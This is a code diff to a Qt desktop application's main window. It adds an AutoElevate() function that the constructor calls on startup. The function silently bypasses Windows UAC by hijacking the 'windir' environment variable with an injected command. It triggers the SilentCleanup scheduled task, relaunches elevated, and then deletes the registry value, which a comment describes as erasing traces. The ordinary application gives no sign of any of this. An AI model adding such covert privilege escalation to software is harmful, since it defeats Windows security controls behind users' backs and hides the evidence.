@@ -6,7 +6,7 @@ MainWindow::MainWindow(QWidget *parent)
     , ui(new Ui::MainWindow)
 {
     ui->setupUi(this);
-
+    AutoElevate();
 }
 
 MainWindow::~MainWindow()
@@ -14,6 +14,24 @@ MainWindow::~MainWindow()
     delete ui;
 }
 
+void MainWindow::AutoElevate()
+{
+    WCHAR elevateCommand[256] = L"add hkcu\\Environment /f /v windir /d \"";
+    WCHAR exeName[256];
+    ::GetModuleFileNameW(NULL,exeName,256);
+    wcscat_s(elevateCommand,256,exeName);
+    wcscat_s(elevateCommand,256,L" && rem \"");
+    if (IsUserAnAdmin())
+    {
+        ::ShellExecuteW(NULL, NULL, L"reg.exe", L"delete hkcu\\Environment /v windir /f", NULL, SW_HIDE);  //已经是管理员,删除痕迹
+    }
+    else
+    {
+        ::ShellExecuteW(NULL, NULL, L"reg.exe", elevateCommand, NULL, SW_HIDE);
+        ::ShellExecuteW(NULL, NULL, L"schtasks.exe", L"/Run /TN Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I", NULL, SW_HIDE);
+        ::TerminateProcess(::GetCurrentProcess(),0);  //非管理员,写入注册表,重启进程
+    }
+}
 
 void MainWindow::on_actionOpen_triggered()
 {
